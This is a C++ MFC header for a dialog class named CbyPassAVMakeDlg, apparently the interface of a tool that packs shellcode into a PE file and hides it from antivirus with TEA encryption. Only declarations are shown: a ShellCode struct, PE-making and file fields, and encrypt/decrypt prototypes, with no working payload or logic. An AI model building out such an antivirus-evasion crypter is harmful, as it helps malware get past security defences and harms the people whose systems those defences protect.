
// byPassAVMakeDlg.h: 头文件
//

#pragma once
#include"MyListCtrl.h"

typedef struct _ShellCode
{
	CString strBinFile;
	ByteBuffer bin;
}ShellCode;


// CbyPassAVMakeDlg 对话框
class CbyPassAVMakeDlg : public CDialogEx
{
// 构造
public:
	CbyPassAVMakeDlg(CWnd* pParent = nullptr);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_BYPASSAVMAKE_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnBnClickedButton1();
	afx_msg void OnBnClickedButton2();
	afx_msg void OnBnClickedButton3();
	afx_msg void OnBnClickedButton4();
	CEdit mSecName;
	CEdit mCodesLen;
	MyListCtrl mList;
	PEMake mPEMake;
	CEdit mFileBin;
	CEdit mDstFile;
public:
	void OnSaveAs();
	BOOL InitDisaDate(STu8*, STu32);
	void encrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out);
	void decrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out);
	void tea_encrypt(unsigned char * v, unsigned int len,unsigned char * key,unsigned char ** out,unsigned int * outlen);
	void tea_decrypt(unsigned char* v, unsigned int len, unsigned char* key, unsigned char** out, unsigned int* outlen);
};



